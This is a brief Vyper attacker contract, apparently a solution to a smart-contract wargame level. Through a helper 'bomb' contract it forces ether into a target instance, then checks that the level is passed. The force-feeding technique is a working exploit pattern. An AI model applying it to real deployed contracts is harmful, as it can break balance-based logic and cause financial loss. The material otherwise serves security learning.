# @version ^0.3.7

owner: immutable(address)

instance: address

@external
@payable
def __init__(_instance: address):
    assert msg.value == 1, "!value"
    owner = msg.sender
    self.instance = _instance

@external
@view
def balanceOf() -> uint256:
    return self.instance.balance

@external
def attack(bomb: address):
    assert msg.sender == owner, "!owner"
    raw_call(bomb, _abi_encode(self.instance), value=self.balance)
    assert self.instance.balance > 0, "level !passed"
